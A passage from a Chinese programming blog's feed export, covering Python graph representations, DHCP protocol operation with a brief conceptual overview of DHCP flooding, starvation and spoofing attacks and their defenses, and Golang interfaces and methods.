<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="string">'h'</span> <span class="keyword">in</span> N[<span class="string">'a'</span>]	<span class="comment"># a 是否有到 h 的边</span></div><div class="line"><span class="keyword">False</span></div><div class="line">&gt;&gt;&gt;len(N[<span class="string">'g'</span>])	<span class="comment"># 节点 g 的度</span></div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure>
<h4 id="嵌套字典"><a href="#嵌套字典" class="headerlink" title="嵌套字典"></a>嵌套字典</h4><p>　　也可以使用嵌套字典的方式来实现加权图。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">N = &#123;<span class="string">'a'</span>:&#123;<span class="string">'b'</span>:<span class="number">2</span>, <span class="string">'c'</span>:<span class="number">1</span>, <span class="string">'d'</span>:<span class="number">3</span>, <span class="string">'e'</span>:<span class="number">9</span>, <span class="string">'f'</span>:<span class="number">4</span>&#125;,</div><div class="line">     <span class="string">'b'</span>:&#123;<span class="string">'c'</span>:<span class="number">4</span>, <span class="string">'e'</span>:<span class="number">3</span>&#125;,</div><div class="line">     <span class="string">'c'</span>:&#123;<span class="string">'d'</span>:<span class="number">8</span>&#125;,</div><div class="line">     <span class="string">'d'</span>:&#123;<span class="string">'e'</span>:<span class="number">7</span>&#125;,</div><div class="line">     <span class="string">'e'</span>:&#123;<span class="string">'f'</span>:<span class="number">5</span>&#125;,</div><div class="line">     <span class="string">'f'</span>:&#123;<span class="string">'c'</span>:<span class="number">2</span>, <span class="string">'g'</span>:<span class="number">2</span>, <span class="string">'h'</span>:<span class="number">2</span>&#125;,</div><div class="line">     <span class="string">'g'</span>:&#123;<span class="string">'f'</span>:<span class="number">1</span>, <span class="string">'h'</span>:<span class="number">6</span>&#125;,</div><div class="line">     <span class="string">'h'</span>:&#123;<span class="string">'f'</span>:<span class="number">9</span>, <span class="string">'g'</span>:<span class="number">8</span>&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="string">'f'</span> <span class="keyword">in</span> N[<span class="string">'e'</span>]	<span class="comment"># e 是否有到 f 的边</span></div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;len(N[<span class="string">'e'</span>])	<span class="comment"># 节点 e 的度</span></div><div class="line"><span class="number">1</span></div><div class="line">&gt;&gt;&gt;N[<span class="string">'a'</span>][<span class="string">'e'</span>]	<span class="comment"># 边(a, e)的权重</span></div><div class="line"><span class="number">9</span></div></pre></td></tr></table></figure>
<h4 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h4><p>　　图的另一种常见表示法就是邻接矩阵。这种表示的主要不同之处在于，它不再列出每个节点的所有邻居节点，而是会将每个节点可能的邻居位置排成一行（也就是一个数组，用于对应图中每一个节点），然后用某种值（如True或False）来表示相关节点是否为当前节点的邻居。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">a, b, c, d, e, f, g, h = range(<span class="number">8</span>)</div><div class="line">N =[</div><div class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</div><div class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</div><div class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</div><div class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</div><div class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</div><div class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>],</div><div class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</div><div class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</div><div class="line">]</div></pre></td></tr></table></figure>
<p>　　测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>N[a][b] <span class="comment"># a 是否有到 f 的边</span></div><div class="line"><span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sum(N[f]) <span class="comment"># 节点 f 的度，不能再用 len 函数</span></div><div class="line"><span class="number">3</span></div></pre></td></tr></table></figure>
<p>　　注意，邻接矩阵中：</p>
<ul>
<li>主对角线为自己到自己，为 0</li>
<li>行和为出度</li>
<li>列和为入度</li>
</ul>
<h4 id="加权邻接矩阵"><a href="#加权邻接矩阵" class="headerlink" title="加权邻接矩阵"></a>加权邻接矩阵</h4><p>　　对不存在的边赋予无限大权值的加权矩阵。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">a, b, c, d, e, f, g, h = range(<span class="number">8</span>)</div><div class="line">inf = float(<span class="string">"inf"</span>)	<span class="comment"># 无穷大</span></div><div class="line">W = [</div><div class="line">    [  <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">1</span>,   <span class="number">3</span>,   <span class="number">9</span>,   <span class="number">4</span>, inf, inf],  <span class="comment"># a</span></div><div class="line">    [inf,   <span class="number">0</span>,   <span class="number">4</span>, inf,   <span class="number">3</span>, inf, inf, inf],  <span class="comment"># b</span></div><div class="line">    [inf, inf,   <span class="number">0</span>,   <span class="number">8</span>, inf, inf, inf, inf],  <span class="comment"># c</span></div><div class="line">    [inf, inf, inf,   <span class="number">0</span>,   <span class="number">7</span>, inf, inf, inf],  <span class="comment"># d</span></div><div class="line">    [inf, inf, inf, inf,   <span class="number">0</span>,   <span class="number">5</span>, inf, inf],  <span class="comment"># e</span></div><div class="line">    [inf, inf,   <span class="number">2</span>, inf, inf,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">2</span>],  <span class="comment"># f</span></div><div class="line">    [inf, inf, inf, inf, inf,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">6</span>],  <span class="comment"># g</span></div><div class="line">    [inf, inf, inf, inf, inf,   <span class="number">9</span>,   <span class="number">8</span>,   <span class="number">0</span>]   <span class="comment"># h</span></div><div class="line">]</div></pre></td></tr></table></figure>
<p>　　测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>W[a][b] &lt; inf <span class="comment"># a 是否有到 b 的边</span></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>W[c][e] &lt; inf <span class="comment"># c 是否有到 e 的边</span></div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sum(<span class="number">1</span> <span class="keyword">for</span> w <span class="keyword">in</span> W[a] <span class="keyword">if</span> w &lt; inf) - <span class="number">1</span> <span class="comment"># 度</span></div><div class="line"><span class="number">5</span></div></pre></td></tr></table></figure>
<p>参考资料：</p>
<p>Hetland M L. Python Algorithms: mastering basic algorithms in the Python Language[M]. Apress, 2014.</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>DHCP：动态主机配置协议</title>
    <url>/2018/09/10/DHCP%EF%BC%9A%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<center>DHCP 协议学习总结。</center>

<a id="more"></a>
<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>　　DHCP (Dynamic Host Configuration Protocol，动态主机配置协议) 提供了即插即用的连网方式，用户不再需要去手动配置 IP 地址等信息。DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、网关 IP 地址。</p>
<p>　　DHCP是一个局域网的网络协议，使用UDP协议工作，常用的2个端口：67(DHCP server)，68(DHCP client)，其工作过程如下：</p>
<ol>
<li>客户端发送 Discover 报文，该报文的目的地址为 255.255.255.255:67，源地址为 0.0.0.0:68，被放入 UDP 中，该报文被广播到同一个子网的所有主机上。如果客户端和 DHCP 服务器不在同一个子网，就需要使用中继代理。</li>
<li>DHCP 服务器收到 Discover 报文之后，发送 Offer 报文给客户端，该报文包含了客户端所需要的信息。因为客户端可能收到多个 DHCP 服务器提供的信息，因此客户端需要进行选择。</li>
<li>如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送 Request 报文给该 DHCP 服务器。</li>
<li>DHCP 服务器发送 Ack 报文，表示客户端此时可以使用提供给它的信息。</li>
</ol>
<p><img src="https://github.com/CyC2018/CS-Notes/raw/master/pics/bf16c541-0717-473b-b75d-4115864f4fbf.jpg" alt=""></p>
<h4 id="DHCP-客户端"><a href="#DHCP-客户端" class="headerlink" title="DHCP 客户端"></a>DHCP 客户端</h4><p>　　DHCP 客户端一般来说是局域网中独立的PC主机，租约、续约、发现、释放IP地址等大多数 DHCP 中的行为都是由 DHCP 客户端主动发起。</p>
<h5 id="重新登录"><a href="#重新登录" class="headerlink" title="重新登录"></a>重新登录</h5><p>　　DHCP 客户端每次重新登录网络时，就不需要再发送 DHCP discover 发现信息，而是直接发送包含前一次所分配的IP地址的 DHCP request 请求信息。然后，</p>
<ul>
<li>如果客户端 DHCP request 内的IP地址在服务器端没有被使用，DHCP服务器回复 DHCP ACK继续使用IP。</li>
<li>如果客户端 DHCP request 内的IP地址在服务器端已被使用，DHCP服务器回复 DHCP NACK告诉客户端IP已被使用。</li>
<li>客户端重新开始DHCP流程。</li>
</ul>
<h5 id="租约与续约"><a href="#租约与续约" class="headerlink" title="租约与续约"></a>租约与续约</h5><p>　　租约就是 DHCP 分配给客户端的IP地址的使用期限，期满后 DHCP 服务器便会收回出租的 IP 地址，然后需要重新分配。如果 DHCP 客户机要延长其IP租约，则必须更新其IP租约。如果租约设置过长，就会出现 IP 地址已经分配完的假象。 </p>
<p>　　在指定的时间间隔内，DHCP 客户端尝试续订租约以保证它能够得到最新的配置信息：</p>
<ul>
<li><strong>自动租约续订 </strong></li>
</ul>
<p>　　DHCP 客户机启动时和IP租约期限到达租约的50%时，DHCP 客户机都会自动向 DHCP 服务器发送更新其IP租约的信息。 如果 DHCP 服务器是可用的，它将续订租约并向客户端发送一条 DHCPACK 消息，此消息包含新的租约期限和一些更新的配置参数。客户端收到确认后就会更新配置。 如果 DHCP 服务器不可用，则客户端将继续使用当前的配置参数。 </p>
<p>　　当租约时间间隔的87.5%到期时，客呼端会广播一条 DHCP DISCOVER 消息来更新它的地址租约。这个阶段，DHCP 客户端会接受从任何 DHCP 服务器发出的租约。如果 DHCP 服务器以一条 DHCPOFFER 消息响应来更新客户端当前的租约，那么客户端可以基于提供消息的服务器续订租约并继续运行。 </p>
<p>　　如果租约到期了，那么客户端必须立即释放当前使用的IP地址。然后，DHCP 客户端重新开始 DHCP 租约过程，尝试租用一个新的 IP 地址。  </p>
<ul>
<li><strong>手动租约续订 </strong></li>
</ul>
<p>　　如果需要立即更新 DHCP 配置消息，用户可以手动续订 IP 租约。例如，如果用户希望 DHCP 客户端立即从DHCP 服务器获取新安装的路由器的地址，那么需要用户从客户端续订租约来更改这些配置。要手动续订租约，使用 ipconfig 命令，并带 /renew 开关参数。这条命令向 DHCP 服务器发送一条 DHCP REQUEST 消息请求更新配置选项和续订租约时间。</p>
<h4 id="DHCP-服务器"><a href="#DHCP-服务器" class="headerlink" title="DHCP 服务器"></a>DHCP 服务器</h4><h5 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h5><p>　　DHCP SERVER 指的是服务器端，在路由器上体现的就是给LAN端动态分配IP的功能。DHCP SERVER 负责接收客户端的 DHCP 请求，管理 LAN 端所有的IP网络设定资料。DHCP 通过“租约”来实现动态分配IP的功能，实现 IP 的时分复用，从而解决 IP 资源短缺的问题。</p>
<p>　　<strong>DHCP服务器提供三种IP分配方式：</strong></p>
<ul>
<li>自动分配 ：自动分配是当 DHCP 客户端第一次成功地从 DHCP 服务器端分配到一个IP地址之后，就永远使用这个地址。</li>
<li><strong>动态分配（最常用）：</strong> 动态分配是当 DHCP 客户端第一次从 DHCP 服务器分配到IP地址后，并非永久地使用该地址，每次使用完后，DHCP 客户端就得释放这个 IP 地址，以给其他客户端使用。</li>
<li>手动分配：手动分配是由 DHCP 服务器管理员专门为客户端指定IP地址。</li>
</ul>
<p>　　<strong>两个租约表：</strong></p>
<ul>
<li>静态租约表：对应一个静态租约存储文件，SERVER 运行时从文件中读取静态租约表。</li>
<li>动态租约表：对应一个周期存储文件，SERVER 周期性将租约表存进该文件，在程序开始时将会读取上次存放的租约表。（租约表记录了当前所有分配的租约，包括静态链接的）。</li>
</ul>
<h5 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h5><p>　　原则上 DHCP SERVER 是一直处在被动接受请求的状态。当有客户端请求时，服务器会读取获得客户端当前所在的状态以及客户端的信息，并在静态租约表和动态租约表中进行检索找到相应的表项，再根据客户端的状态执行不同的回复。当收到客户端的首次请求时，DHCP 服务器先查找静态租约表；若存在请求的表项，返回这个客户的静态 IP 地址；否则，从 IP 地址池中选择可用的 IP 分配给客户，并添加信息到动态数据库中。此外，服务器将会周期性的刷新租约表写入文件存档，在这个过程中会顺便对动态租约表进行租期检查。</p>
<p>　　DHCP 服务器收到相应请求后会执行回复动作：</p>
<ul>
<li><p>DHCPOFFER：</p>
<ul>
<li>静态租用：首先匹配MAC地址，看是否能在静态租约表中找到对应的项，若能找到就把IP分配给他。静态表中的IP不能被其他客户使用。</li>
<li>动态租用：<ul>
<li>server试图分配给client上次分配过的IP，在这之前检查这个 IP 是否正在使用。</li>
<li>discover中含有request ip 时，检查该IP是否在地址池范围，是否正在使用，是否到期，是否是静态IP，网络上是否已经存在。</li>
<li>discover不含request ip，从地址池上寻找一个最小的可用IP分配。</li>
</ul>
</li>
</ul>
</li>
<li><p>DHCPACK：</p>
<p>　　根据是否含有 request ip 和 server ip 识别客户端现在 init_reboot,selecting,renewing/rebinding 中的哪个状态，并根据以下规则执行 DHCP ACK 回复：</p>
<ul>
<li>若 client 处于 selecting 状态，验证 request ip 和 server ip 是否同服务器中的匹配。</li>
<li>若 client 处于 init_reboot 状态，验证 request ip 是否符合租约记录。</li>
<li>若 client 处于 renewing/rebinding 状态，验证 client ip address 是否符合租约记录。</li>
</ul>
</li>
<li><p>……</p>
</li>
</ul>
<h4 id="DHCP-攻击"><a href="#DHCP-攻击" class="headerlink" title="DHCP 攻击"></a>DHCP 攻击</h4><h5 id="DHCP-洪泛攻击"><a href="#DHCP-洪泛攻击" class="headerlink" title="DHCP 洪泛攻击"></a>DHCP 洪泛攻击</h5><p>　　在 DHCP 网络环境中，若存在 DHCP 用户短时间内向设备发送大量的 DHCP 报文，将会对设备的性能造成巨大的冲击以致可能会导致设备无法正常工作。通过使能对 DHCP 报文上送 DHCP 报文处理单元的速率进行检测功能将能够有效防止 DHCP 报文泛洪攻击。</p>
<p>　　防范：配置限制 DHCP 报文的上送速率。</p>
<h5 id="DHCP-耗尽攻击"><a href="#DHCP-耗尽攻击" class="headerlink" title="DHCP 耗尽攻击"></a>DHCP 耗尽攻击</h5><p>　　用虚假的MAC地址广播伪造的 DHCP 请求，如果发送了大量的请求，攻击者可以在一定时间内耗尽 DHCP Servers 可提供的地址空间。</p>
<p>　　防范：可以通过交换机的 Port-Security（端口安全性）功能来防范耗尽攻击。</p>
<h5 id="DHCP-假冒攻击"><a href="#DHCP-假冒攻击" class="headerlink" title="DHCP 假冒攻击"></a>DHCP 假冒攻击</h5><p>　　耗尽 DHCP 服务端的地址资源之后，攻击者可以仿冒一个 DHCP 服务器来响应网络上其他客户的 DHCP 请求，从而实现 DHCP 假冒攻击。攻击者伪造 DHCP 服务器给计算机分配 IP，并指定一个虚假的 DNS 服务器地址，当用户访问网站的时候，就被虚假DNS服务器引导到错误的网站。</p>
<p>　　防范：通过传统的 DHCP Snooping 技术就可以来防范 DHCP 假冒攻击。当启用 DHCP Snooping 功能之后，交换机的所有端口都将无法接收 DHCP Offer 报文，假冒的 DHCP 服务器就无法向外分配IP地址了。DHCP Snooping 可以防止假冒攻击，但是无法防止耗尽攻击，因为尽攻击所采用的都是客户端正常发送的 DHCP Discover 报文。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>DHCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-接口</title>
    <url>/2018/09/02/Golang%20%E7%AC%94%E8%AE%B0-%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<center>Golang 接口学习。</center>

<a id="more"></a>
<h4 id="定义与使用"><a href="#定义与使用" class="headerlink" title="定义与使用"></a>定义与使用</h4><p>　　Go 语言中没有类和继承的概念，但是它里有非常灵活的 <strong>接口</strong> 概念，通过它可以实现很多面向对象的特性。接口提供了一种方式来 <strong>说明</strong> 对象的行为：如果谁能搞定这件事，它就可以用在这儿。接口定义了一组方法（方法集），但是这些方法不包含实现代码。并且，接口里也不能包含变量。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Namer <span class="keyword">interface</span> &#123;</div><div class="line">    Method1(param_list) return_type</div><div class="line">    Method2(param_list) return_type</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　一般情况下，接口的名字由方法名加 <code>[e]r</code> 后缀组成，例如 <code>Printer</code>、<code>Reader</code>、<code>Writer</code> 等等。当后缀 <code>er</code> 不合适时，接口名也可以以 <code>able</code> 结尾，或者以 <code>I</code> 开头。Go 语言中的接口都很简短，通常它们会包含 0 个、最多 3 个方法。</p>
<p>　　类型（比如结构体）实现接口方法集中的方法，每一个方法的实现说明了此方法是如何作用于该类型的：<strong>即实现接口</strong>，同时方法集也构成了该类型的接口。实现了 <code>Namer</code> 接口类型的变量可以赋值给接收者值，此时方法表中的指针会指向被实现的接口方法。当然，如果另一个类型（也实现了该接口）的变量被赋值给接收者值，这二者也会随之改变。</p>
<p>　　接口具有很大的灵活性的原因：</p>
<ul>
<li>类型不需要显式声明它实现了某个接口：接口被隐式地实现。</li>
<li>多个类型可以实现同一个接口，一个类型也可以实现多个接口。</li>
<li>实现某个接口的类型，除了实现接口方法外，也可以有其他的方法。</li>
<li>接口类型可以包含一个实例的引用， 该实例的类型实现了此接口（接口是动态类型）。</li>
<li>即使接口在类型之后才定义，二者处于不同的包中，被单独编译：<strong>只要类型实现了接口中的方法，它就实现了此接口</strong>。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> School <span class="keyword">struct</span> &#123; <span class="comment">// 结构体</span></div><div class="line">	name <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> Valuer <span class="keyword">interface</span> &#123; <span class="comment">// 接口</span></div><div class="line">	getName() <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *School)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> s.name</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> v Valuer = &amp;School&#123;<span class="string">"CSU"</span>&#125; <span class="comment">// 结构体变量赋值给接口变量</span></div><div class="line">	fmt.Println(v.getName())      <span class="comment">// 调用方法</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">CSU</div></pre></td></tr></table></figure>
<p>　　如上，定义了一个结构体 <code>School</code> 和 一个接口 <code>Value</code> ，接口有两个方法 <code>getName()</code> 和 <code>getId()</code>，在 <code>main()</code> 函数中创建了一个 <code>School</code> 实例并赋值给了接口类型的变量，现在接口变量包含一个指向 <code>School</code> 变量的引用，通过它可以调用 <code>School</code> 上的方法 <code>getName()</code> 和 <code>getId()</code>。</p>
<p>　　在接口上调用方法时，必须有和方法定义时相同的接收者类型或者是可以从具体类型 <code>P</code> 直接可以辨识的：</p>
<ul>
<li>指针方法可以通过指针调用</li>
<li>值方法可以通过值调用</li>
<li>接收者是值的方法可以通过指针调用，因为指针会首先被解引用</li>
<li>接收者是指针的方法不可以通过值调用，因为存储在接口中的值没有地址</li>
</ul>
<p>　　将一个值赋值给一个接口时，编译器会确保所有可能的接口方法都可以在此值上被调用，因此不正确的赋值在编译期就会失败。</p>
<p>　　多态：根据当前的类型选择正确的方法，或者说：同一种类型在不同的实例上似乎表现出不同的行为。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> School <span class="keyword">struct</span> &#123; <span class="comment">// 结构体</span></div><div class="line">	name <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123; <span class="comment">// 结构体</span></div><div class="line">	name <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> Valuer <span class="keyword">interface</span> &#123; <span class="comment">// 接口</span></div><div class="line">	getName() <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *School)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123; <span class="comment">// 接收者为指针类型</span></div><div class="line">	<span class="keyword">return</span> s.name</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Student)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123; <span class="comment">// 接收者为值类型</span></div><div class="line">	<span class="keyword">return</span> s.name</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	sc := &amp;School&#123;<span class="string">"CSU"</span>&#125;	<span class="comment">// 指针类型</span></div><div class="line">	st := Student&#123;<span class="string">"fzy"</span>&#125;	<span class="comment">// 值类型</span></div><div class="line">	v := []Valuer&#123;sc, st&#125;</div><div class="line">	<span class="keyword">for</span> _, vi := <span class="keyword">range</span> v &#123;</div><div class="line">		fmt.Println(vi.getName())</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　如上，在调用 <code>vi.getName()</code> 时，只知道 <code>vi</code> 是一个 <code>Valuer</code> 接口， 实际却是 <code>School</code> 和 <code>Student</code> 变量，并且可以调用他们所实现的方法。</p>
<h4 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h4><h5 id="使用-if-type"><a href="#使用-if-type" class="headerlink" title="使用 if-type"></a>使用 if-type</h5><figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> v, ok := vi.(T); ok &#123;  <span class="comment">// 例如检查上面例子中的接口vi是否是类型T</span></div><div class="line">    Process(v)</div><div class="line">    <span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// vi 不是类型 T</span></div></pre></td></tr></table></figure>
<p>　　如果转换合法，<code>v</code> 是 <code>vi</code> 转换到类型 <code>T</code> 的值，<code>ok</code> 会是 <code>true</code>；否则 <code>v</code> 是类型 <code>T</code> 的零值，<code>ok</code> 是 <code>false</code>，也没有运行时错误发生。</p>
<h5 id="使用-type-switch"><a href="#使用-type-switch" class="headerlink" title="使用 type-switch"></a>使用 type-switch</h5><p>　　接口变量的类型也可以使用一种特殊形式的 <code>switch</code> 来检测：<strong>type-switch</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">switch</span> t := vi.(<span class="keyword">type</span>) &#123;</div><div class="line"><span class="keyword">case</span> *School:</div><div class="line">	fmt.Printf(<span class="string">"Type School %T with value %v\n"</span>, t, t)</div><div class="line"><span class="keyword">case</span> *Student:</div><div class="line">	fmt.Printf(<span class="string">"Type Student %T with value %v\n"</span>, t, t)</div><div class="line"><span class="keyword">case</span> <span class="literal">nil</span>:</div><div class="line">	fmt.Printf(<span class="string">"nil value: nothing to check?\n"</span>)</div><div class="line"><span class="keyword">default</span>:</div><div class="line">	fmt.Printf(<span class="string">"Unexpected type %T\n"</span>, t)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　其中，变量 <code>t</code> 得到了 <code>vi</code> 的类型，然后通过 <code>switch</code> 匹配进行相应的处理。也可以用 <code>type-switch</code> 进行运行时类型分析，但是在 <code>type-switch</code> 不允许有 <code>fallthrough</code> 。</p>
<h4 id="测试一个值是否实现了某个接口"><a href="#测试一个值是否实现了某个接口" class="headerlink" title="测试一个值是否实现了某个接口"></a>测试一个值是否实现了某个接口</h4><p>　　假定 <code>v</code> 是一个值，然后我们想测试它是否实现了上面的 <code>Valuer</code> 接口，可以这样做：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Valuer <span class="keyword">interface</span> &#123;</div><div class="line">    getName() <span class="keyword">string</span></div><div class="line">	getId() <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> _, ok := v.(Valuer); ok &#123;</div><div class="line">    <span class="comment">// v 实现了 Valuer 接口</span></div><div class="line">    fmt.Println(v.getName(), v.getId())</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　接口是一种契约，实现类型必须满足它，它描述了类型的行为，规定类型可以做什么。接口彻底将类型能做什么，以及如何做分离开来，使得相同接口的变量在不同的时刻表现出不同的行为，这就是多态的本质。</p>
<h4 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h4><p>　　<strong>空接口或者最小接口</strong> 不包含任何方法，它对实现不做任何要求：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Any <span class="keyword">interface</span> &#123;&#125;</div></pre></td></tr></table></figure>
<p>　　任何其他类型都实现了空接口（它不仅仅像 <code>Java/C#</code> 中 <code>Object</code> 引用类型），<code>any</code> 或 <code>Any</code> 是空接口一个很好的别名或缩写。</p>
<p>　　空接口类似 <code>Java/C#</code> 中所有类的基类： <code>Object</code> 类，二者的目标也很相近。可以给一个空接口类型的变量赋任何类型的值。</p>
<p>　　构建通用类型或包含不同类型变量的数组：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">type</span> Element <span class="keyword">interface</span>&#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> Vector <span class="keyword">struct</span> &#123;</div><div class="line">	a [<span class="number">10</span>]Element</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Vector)</span> <span class="title">At</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">Element</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> p.a[i]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Vector)</span> <span class="title">Set</span><span class="params">(i <span class="keyword">int</span>, e Element)</span></span> &#123;</div><div class="line">	p.a[i] = e</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	v := <span class="built_in">new</span>(Vector)</div><div class="line">	v.Set(<span class="number">0</span>, <span class="string">"fzy"</span>)</div><div class="line">	v.Set(<span class="number">1</span>, <span class="number">111</span>)</div><div class="line">	fmt.Println(v.At(<span class="number">0</span>), v.At(<span class="number">1</span>))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">fzy 111</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-方法</title>
    <url>/2018/09/02/Golang%20%E7%AC%94%E8%AE%B0-%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<center>Golang 方法学习</center>

<a id="more"></a>
<p>　　上一篇博客，我们介绍了 Go 语言中的结构体，它就像是类的一种简化形式。这篇博客要介绍的是 Go 语言中的方法，类似于面向对象语言中类的。Go 方法是作用在接收者（receiver）上的一个函数，接收者是某种类型的变量。因此方法是一种特殊类型的函数。 </p>
<p>　　<strong>一个类型加上它的方法等价于面向对象中的一个类</strong>。一个重要的区别是：在 Go 语言中，类型的代码和绑定在它上面的方法的代码可以不放置在一起，它们可以存在在不同的源文件，唯一的要求是：它们必须是同一个包的。 </p>
<h4 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h4><p>　　方法的定义与普通函数的定义类似，只是在函数名字前面多了个参数，这个参数就是接收者，它将方法绑定到接收者对应的类型。定义方法的一般格式如下：</p>
